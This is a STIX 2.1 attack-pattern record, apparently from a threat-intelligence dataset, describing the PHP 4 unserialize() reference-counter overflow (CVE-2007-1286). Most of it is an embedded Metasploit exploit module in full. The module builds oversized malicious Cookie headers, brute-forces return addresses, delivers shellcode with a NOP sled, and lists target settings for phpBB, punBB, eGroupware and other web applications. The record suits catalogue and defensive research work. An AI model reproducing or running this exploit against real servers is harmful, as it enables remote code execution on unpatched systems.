{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aa0cd2c5-b917-41e9-88b0-9b2f52844958",
    "created": "2024-08-14T17:05:20.248202Z",
    "modified": "2024-08-14T17:05:20.248206Z",
    "name": "PHP 4 unserialize() ZVAL Reference Counter Overflow (Cookie)",
    "description": " This module exploits an integer overflow vulnerability in the unserialize() function of the PHP web server extension. This vulnerability was patched by Stefan in version 4.5.0 and applies all previous versions supporting this function. This particular module targets numerous web applications and is based on the proof of concept provided by Stefan Esser. This vulnerability requires approximately 900k of data to trigger due the multiple Cookie headers requirement. Since we are already assuming a fast network connection, we use a 2Mb block of shellcode for the brute force, allowing quick exploitation for those with fast networks.  One of the neat things about this vulnerability is that on x86 systems, the EDI register points into the beginning of the hashtable string. This can be used with an egghunter to quickly exploit systems where the location of a valid \"jmp EDI\" or \"call EDI\" instruction is known. The EDI method is faster, but the bandwidth-intensive brute force used by this module is more reliable across a wider range of systems. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/php/php_unserialize_zval_cookie.rb",
            "external_id": "php_unserialize_zval_cookie.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1286"
        },
        {
            "source_name": "reference",
            "url": "http://www.php-security.org/MOPB/MOPB-04-2007.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PHP 4 unserialize() ZVAL Reference Counter Overflow (Cookie)',\n      'Description'    => %q{\n          This module exploits an integer overflow vulnerability in the unserialize()\n        function of the PHP web server extension. This vulnerability was patched by\n        Stefan in version 4.5.0 and applies all previous versions supporting this function.\n        This particular module targets numerous web applications and is based on the proof\n        of concept provided by Stefan Esser. This vulnerability requires approximately 900k\n        of data to trigger due the multiple Cookie headers requirement. Since we\n        are already assuming a fast network connection, we use a 2Mb block of shellcode for\n        the brute force, allowing quick exploitation for those with fast networks.\n\n        One of the neat things about this vulnerability is that on x86 systems, the EDI register points\n        into the beginning of the hashtable string. This can be used with an egghunter to\n        quickly exploit systems where the location of a valid \"jmp EDI\" or \"call EDI\" instruction\n        is known. The EDI method is faster, but the bandwidth-intensive brute force used by this\n        module is more reliable across a wider range of systems.\n      },\n      'Author'         =>\n        [\n          'hdm',                                        # module development\n          'GML <grandmasterlogic[at]gmail.com>',      # module development and debugging\n          'Stefan Esser <sesser[at]hardened-php.net>' # discovered, patched, exploited\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-1286'],\n          ['OSVDB', '32771'],\n          ['URL', 'http://www.php-security.org/MOPB/MOPB-04-2007.html'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n        },\n      'Platform'       => %w{ linux },\n      'Targets'        =>\n        [\n\n          #\n          # 64-bit SuSE:    0x005c0000\n          # Backtrack 2.0:  0xb797a000\n          # Gentoo:         0xb6900000\n          #\n          [ 'Linux x86 Generic',\n            {\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ],\n          [ 'Linux x86 phpBB2',\n            {\n              'DefaultCookie' => 'phpbb2mysql_data',\n              'DefaultURI'    => '/phpBB2/faq.php',\n              'Signature'     => /Powered\\s+by.*phpBB/,\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ],\n          [ 'Linux x86 punBB',\n            {\n              'DefaultCookie' => 'punbb_cookie',\n              'DefaultURI'    => '/index.php',\n              'Signature'     => /Powered\\s+by.*PunBB/,\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ],\n          [ 'Linux x86 WWWThreads',\n            {\n              'DefaultCookie' => 'forum_cookie',\n              'DefaultURI'    => '/index.php',\n              'Signature'     => /Powered\\s+by.*WWWThreads/,\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ],\n          [ 'Linux x86 Deadman Redirect',\n            {\n              'DefaultCookie' => 'authcookie',\n              'DefaultURI'    => '/dmr/dmr.php',\n              'Signature'     => /document\\.f\\.userdata\\.focus/,\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ],\n          [ 'Linux x86 PhpWebGallery',\n            {\n              'DefaultCookie' => 'pwg_remember',\n              'DefaultURI'    => '/phpwebgallery/index.php',\n              'Signature'     => /Powered\\s+by.*phpwebgallery/msi,\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ],\n          [ 'Linux x86 Ariadne-CMS',\n            {\n              'DefaultCookie' => 'ARCookie',\n              'DefaultURI'    => '/ariadne/loader.php/',\n              'Signature'     => /Ariadne is free software/,\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ],\n          [ 'Linux x86 ProMA',\n            {\n              'DefaultCookie' => 'proma',\n              'DefaultURI'    => '/proma/index.php',\n              'Signature'     => /Change Account Information/,\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ],\n          [ 'Linux x86 eGroupware',\n            {\n              'DefaultCookie' => 'eGW_remember',\n              'DefaultURI'    => '/egroupware/login.php',\n              'Signature'     => /www.egroupware.org/,\n              'Platform'      => 'linux',\n              'Arch'          => [ ARCH_X86 ],\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xb6000400 },\n                  'Stop'  => { 'Ret' => 0xbfff0000 },\n                  'Step'  => 1024*1024\n                }\n            }\n          ]\n        ],\n      'DisclosureDate' => '2007-03-04'))\n\n      register_options(\n        [\n          OptString.new('URI', [false, \"The path to vulnerable PHP script\"]),\n          OptString.new('COOKIENAME', [false, \"The name of the cookie passed to unserialize()\"])\n        ])\n  end\n\n\n  def check\n    vprint_status(\"Checking for a vulnerable PHP version...\")\n\n    #\n    # Pick the URI and Cookie name\n    #\n    cookie_name = datastore['COOKIENAME'] || target['DefaultCookie']\n    uri_path    = normalize_uri(datastore['URI']) || target['DefaultURI']\n\n    if(not cookie_name)\n      fail_with(Failure::Unknown, \"The COOKIENAME option must be set\")\n    end\n\n    if(not uri_path)\n      fail_with(Failure::Unknown, \"The URI option must be set\")\n    end\n\n    res = send_request_cgi({\n      'uri'\t\t  => uri_path,\n      'method'\t  => 'GET'\n    }, 5)\n\n    php_bug = false\n\n    if (not res)\n      vprint_status(\"No response from the server\")\n      return Exploit::CheckCode::Unknown # User should try again\n    end\n\n    http_fingerprint({ :response => res })  # check method\n\n    if (res.code != 200)\n      vprint_status(\"The server returned #{res.code} #{res.message}\")\n      return Exploit::CheckCode::Safe\n    end\n\n    if (\n        (res.headers['X-Powered-By'] and res.headers['X-Powered-By'] =~ /PHP\\/(.*)/) or\n        (res.headers['Server'] and res.headers['Server'] =~ /PHP\\/(.*)/)\n      )\n\n      php_raw = $1\n      php_ver = php_raw.split('.')\n\n      if (php_ver[0].to_i == 4 and php_ver[1] and php_ver[2] and php_ver[1].to_i < 5)\n        vprint_status(\"The server runs a vulnerable version of PHP (#{php_raw})\")\n        php_bug = true\n      else\n        vprint_status(\"The server runs a non-vulnerable version of PHP (#{php_raw})\")\n        return Exploit::CheckCode::Safe\n      end\n    end\n\n    # Detect the phpBB cookie name\n    if res.get_cookies =~ /(.*)_(sid|data)=/\n      vprint_status(\"The server may require a cookie name of '#{$1}_data'\")\n    end\n\n    if(target and target['Signature'])\n      if (res.body and res.body.match(target['Signature']))\n        vprint_status(\"Detected target #{target.name}\")\n      else\n        vprint_status(\"Did not detect target #{target.name}\")\n      end\n\n    end\n\n    return php_bug ? Exploit::CheckCode::Appears : Exploit::CheckCode::Detected\n  end\n\n\n  def brute_exploit(target_addrs)\n\n    zvalref   = encode_semis('i:0;R:2;')\n\n#\n# Use this if we decide to do 'jmp edi' returns vs brute force\n#\n=begin\n    # Linux specific egg-hunter\n    tagger = \"\\x90\\x50\\x90\\x50\"\n    hunter =\n      \"\\xfc\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\" +\n      \"\\x3c\\xf2\\x74\\xf1\\xb8\" +\n      tagger +\n      \"\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7\"\n\n    egghunter = \"\\xcc\" * 39\n    egghunter[0, hunter.length] = hunter\n\n    hashtable = \"\\xcc\" * 39\n    hashtable[0, 2] = \"\\xeb\\xc6\" # jmp back 32 bytes\n\n    hashtable[20, 4] = [target_addrs['Ret']].pack('V')\n    hashtable[32, 4] = [target_addrs['Ret']].pack('V')\n=end\n\n    #\n    # Just brute-force addresses for now\n    #\n    tagger    = ''\n    egghunter = rand_text_alphanumeric(39)\n    hashtable = rand_text_alphanumeric(39)\n    hashtable[20, 4] = [target_addrs['Ret']].pack('V')\n    hashtable[32, 4] = [target_addrs['Ret']].pack('V')\n\n\n    #\n    # Pick the URI and Cookie name\n    #\n    cookie_name = datastore['COOKIENAME'] || target['DefaultCookie']\n    uri_path    = normalize_uri(datastore['URI']) || target['DefaultURI']\n\n    if(not cookie_name)\n      fail_with(Failure::Unknown, \"The COOKIENAME option must be set\")\n    end\n\n    if(not uri_path)\n      fail_with(Failure::Unknown, \"The URI option must be set\")\n    end\n\n    # Generate and reuse the original buffer to save CPU\n    if (not @saved_cookies)\n\n      # Building the malicious request\n      print_status(\"Creating the request...\")\n\n      # Create the first cookie header to get this started\n      cookie_fun = \"Cookie: #{cookie_name}=\"\n      cookie_fun << Rex::Text.uri_encode(\n        'a:100000:{s:8:\"' +\n        rand_text_alphanumeric(8) +\n        '\";a:3:{s:12:\"' +\n        rand_text_alphanumeric(12) +\n        '\";a:1:{s:12:\"' +\n        rand_text_alphanumeric(12) +\n        '\";i:0;}s:12:\"' +\n        rand_text_alphanumeric(12) +\n        '\";'+\n        'i:0;s:12:\"' +\n        rand_text_alphanumeric(12) +\n        '\";i:0;}'\n      )\n      cookie_fun << zvalref * 500\n      cookie_fun << Rex::Text.uri_encode('s:2:\"')\n      cookie_fun << \"\\r\\n\"\n\n      refcnt = 1000\n      refmax = 65535\n\n      # Keep adding cookie headers...\n      while(refcnt < refmax)\n\n        chead   = 'Cookie: ';\n        chead  << encode_semis('\";N;')\n\n        # Stay within the 8192 byte limit\n        0.upto(679) do |i|\n          break if refcnt >= refmax\n          refcnt += 1\n\n          chead << zvalref\n        end\n        chead << encode_semis('s:2:\"')\n        cookie_fun << chead + \"\\r\\n\"\n      end\n\n      # The final header, including the hashtable with return address\n      cookie_fun << \"Cookie: \"\n      cookie_fun << Rex::Text.uri_encode('\";N;')\n      cookie_fun << zvalref * 500\n\n      @saved_cookies = cookie_fun\n    end\n\n    # Generate and reuse the payload to save CPU time\n    if (not @saved_payload)\n      @saved_payload = ((tagger + tagger + make_nops(8192) + payload.encoded) * 256)\n    end\n\n    cookie_addrs = Rex::Text.uri_encode(\n      's:39:\"' + egghunter + '\";s:39:\"'+ hashtable +'\";i:0;R:3;'\n    ) + \"\\r\\n\"\n\n    print_status(\"Trying address 0x%.8x...\" % target_addrs['Ret'])\n    res = send_request_cgi({\n      'uri'\t\t  => uri_path,\n      'method'\t  => 'POST',\n      'raw_headers' => @saved_cookies + cookie_addrs,\n      'data'        => @saved_payload\n    }, 1)\n\n\n    if res\n      failed = false\n\n      print_status(\"Received a response: #{res.code} #{res.message}\")\n\n      if (res.code != 200)\n        print_error(\"The server returned a non-200 response, indicating that the exploit failed\")\n        failed = true\n      end\n\n      if (not failed and (res.body and res.body.length > 0))\n        print_error(\"The server returned a real response, indicating that the exploit failed\")\n        failed = true\n      end\n\n      if (failed)\n        print_status(\"Please verify the URI and COOKIENAME parameters.\")\n        print_line('')\n        print_line(\"*\" * 40)\n        print_line(res.body)\n        print_line(\"*\" * 40)\n        print_line('')\n\n        fail_with(Failure::Unknown, \"Exploit settings are probably wrong\")\n      end\n    else\n      print_status(\"No response from the server\")\n    end\n\n  end\n\n  def encode_semis(str)\n    str.gsub(';') { |s| sprintf(\"%%%.2x\", s[0]) }\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-03-04",
    "x_mitre_platforms": [
        "linux'"
    ]
}